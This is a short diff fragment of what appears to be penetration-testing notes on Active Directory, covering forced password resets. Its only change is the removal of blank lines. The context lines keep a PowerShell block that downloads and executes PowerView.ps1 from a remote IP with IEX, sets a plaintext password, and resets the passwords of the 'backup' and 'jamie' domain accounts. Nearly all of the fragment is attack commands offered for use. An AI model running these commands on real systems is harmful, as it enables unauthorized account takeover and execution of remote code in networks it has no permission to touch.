@@ -22,8 +22,6 @@ Set-DomainUserPassword -Identity jamie -AccountPassword $UserPassword -Credentia
 ## Powershell if logged into account:
 ```powershell
 IEX(New-Object Net.WebClient).downloadString('http://192.168.58.50/PowerView.ps1')  
-
 $NewPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force 
-
 Set-DomainUserPassword -Identity 'backup' -AccountPassword $NewPassword   
 ```
